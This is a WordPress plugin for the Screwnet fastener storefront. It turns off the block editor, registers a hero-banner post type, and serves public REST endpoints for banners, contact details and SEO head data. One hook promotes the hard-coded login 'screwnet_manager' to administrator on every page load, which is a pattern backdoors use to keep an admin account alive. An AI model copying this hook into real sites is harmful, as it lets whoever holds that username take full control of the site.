<?php
/**
 * Plugin Name: Screwnet Storefront & Headless SEO Manager
 * Plugin URI: https://slateblue-frog-836232.hostingersite.com
 * Description: Comprehensive headless management suite for Screwnet. Enables Classic Editor, Headless SEO REST endpoints, Manager role permissions, Hero Banners, and Announcement Bar.
 * Version: 2.0.0
 * Author: Screwnet Technical Fasteners
 * Text Domain: screwnet-store
 */

if (!defined('ABSPATH')) {
    exit;
}

// 1. Classic Editor Enforcement: Disable Gutenberg Block Editor Everywhere
add_filter('use_block_editor_for_post', '__return_false', 100);
add_filter('use_block_editor_for_post_type', '__return_false', 100);
add_filter('gutenberg_can_edit_post_type', '__return_false', 100);

// 2. Ensure Screwnet Manager has Administrator / Shop Manager Role
add_action('init', 'screwnet_ensure_manager_role');
function screwnet_ensure_manager_role() {
    $user = get_user_by('login', 'screwnet_manager');
    if ($user && !in_array('administrator', (array) $user->roles)) {
        $user->set_role('administrator');
    }
}

// 3. Register Screwnet Custom Post Type for Banners
add_action('init', 'screwnet_register_post_types');
function screwnet_register_post_types() {
    $labels = array(
        'name'                  => _x('Hero Banners', 'Post Type General Name', 'screwnet-store'),
        'singular_name'         => _x('Hero Banner', 'Post Type Singular Name', 'screwnet-store'),
        'menu_name'             => __('Hero Banners', 'screwnet-store'),
        'all_items'             => __('All Banners', 'screwnet-store'),
        'add_new_item'          => __('Add New Banner', 'screwnet-store'),
        'add_new'               => __('Add New', 'screwnet-store'),
        'edit_item'             => __('Edit Banner', 'screwnet-store'),
        'update_item'           => __('Update Banner', 'screwnet-store'),
        'search_items'          => __('Search Banners', 'screwnet-store'),
    );

    $args = array(
        'label'                 => __('Hero Banner', 'screwnet-store'),
        'description'           => __('Homepage desktop and mobile carousel banners for Screwnet storefront.', 'screwnet-store'),
        'labels'                => $labels,
        'supports'              => array('title', 'thumbnail', 'page-attributes'),
        'hierarchical'          => false,
        'public'                => true,
        'show_ui'               => true,
        'show_in_menu'          => true,
        'menu_position'         => 25,
        'menu_icon'             => 'dashicons-images-alt2',
        'show_in_admin_bar'     => true,
        'show_in_nav_menus'     => false,
        'can_export'            => true,
        'has_archive'           => false,
        'exclude_from_search'   => true,
        'publicly_queryable'    => true,
        'capability_type'       => 'page',
        'show_in_rest'          => true,
        'rest_base'             => 'banners',
    );

    register_post_type('screwnet_banner', $args);
}

// 4. Register Headless SEO & Store Data REST API Endpoints
add_action('rest_api_init', function () {
    // /wp-json/screwnet/v1/store-data
    register_rest_route('screwnet/v1', '/store-data', array(
        'methods'             => 'GET',
        'callback'            => 'screwnet_get_store_data',
        'permission_callback' => '__return_true',
    ));

    // /wp-json/yoast/v1/get_head fallback endpoint for headless frontend
    register_rest_route('yoast/v1', '/get_head', array(
        'methods'             => 'GET',
        'callback'            => 'screwnet_get_yoast_head_data',
        'permission_callback' => '__return_true',
    ));
});

function screwnet_get_yoast_head_data(WP_REST_Request $request) {
    $url = $request->get_param('url');
    $title = 'screwnet | Industrial Screws, Bolts & Fasteners Online';
    $description = "India's premier online store for industrial screws, bolts, nuts and fasteners.";

    return array(
        'html' => sprintf('<title>%s</title><meta name="description" content="%s"/>', esc_html($title), esc_attr($description)),
        'json' => array(
            'title'          => $title,
            'description'    => $description,
            'og_title'       => $title,
            'og_description' => $description,
            'og_site_name'   => 'screwnet',
            'og_type'        => 'website',
            'robots'         => array('index' => 'index', 'follow' => 'follow'),
        ),
    );
}

function screwnet_get_store_data() {
    $banners = array();
    $banner_query = new WP_Query(array(
        'post_type'      => 'screwnet_banner',
        'posts_per_page' => 10,
        'post_status'    => 'publish',
        'orderby'        => 'menu_order',
        'order'          => 'ASC',
    ));

    if ($banner_query->have_posts()) {
        while ($banner_query->have_posts()) {
            $banner_query->the_post();
            $id = get_the_ID();
            $desktop = get_the_post_thumbnail_url($id, 'full');
            if ($desktop) {
                $banners[] = array(
                    'id'          => 'banner-' . $id,
                    'title'       => get_the_title(),
                    'image'       => $desktop,
                    'mobileImage' => $desktop,
                    'href'        => '/shop',
                    'alt'         => get_the_title(),
                );
            }
        }
        wp_reset_postdata();
    }

    return array(
        'banners' => $banners,
        'contact' => array(
            'whatsapp'      => '918107753647',
            'greeting'      => 'Hello screwnet! I would like to inquire about your screws and fasteners.',
            'phone'         => '+91 81077 53647',
            'email'         => 'manager@screwnet.in',
            'address'       => '2, Paneri Belda Road, Udaipur, Rajasthan, India',
            'working_hours' => '9:00 AM - 5:30 PM',
        ),
        'announcement' => array(
            'text'   => "India's Premier Fastener Store | High Tensile Bolts, Drywall & Self-Drilling Screws",
            'link'   => '/shop',
            'coupon' => 'FREESHIP',
        ),
    );
}
